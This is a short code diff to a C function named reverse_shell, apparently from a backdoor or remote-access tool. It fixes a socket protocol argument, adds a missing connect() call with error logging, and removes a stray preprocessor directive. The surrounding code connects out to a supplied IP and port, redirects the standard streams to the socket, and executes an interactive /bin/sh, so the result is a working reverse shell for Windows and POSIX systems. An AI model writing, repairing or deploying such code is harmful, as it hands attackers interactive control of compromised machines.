@@ -179,11 +179,12 @@ void reverse_shell(char *ip, int port) {
     shell_fd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
 #else
     sockin.sin_addr.s_addr = inet_addr(ip);
-    shell_fd = socket(AF_INET, SOCK_STREAM, ip);
+    shell_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 #endif // _WIN32
 
 #ifdef _WIN32
     if (WSAConnect(shell_fd, (SOCKADDR*)&sockin, sizeof(sockin), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
+        log_message("Could not connect\n");
         closesocket(shell_fd);
         WSACleanup();
         return;
@@ -205,6 +206,12 @@ void reverse_shell(char *ip, int port) {
     WSACleanup();
 
 #else
+    if (connect(shell_fd, (struct sockaddr *)&sockin, sizeof(sockin)) == SOCKET_ERROR) {
+        log_message("Could not connect\n");
+        close(shell_fd);
+        return;
+    }
+
     write(shell_fd, SHELL_MOTD, strlen(SHELL_MOTD));
 
     dup2(shell_fd, 0);
@@ -213,7 +220,6 @@ void reverse_shell(char *ip, int port) {
 
     execl("/bin/sh", "sh", "-i", NULL, NULL);
     close(shell_fd);
-#end
 #endif
 
 }
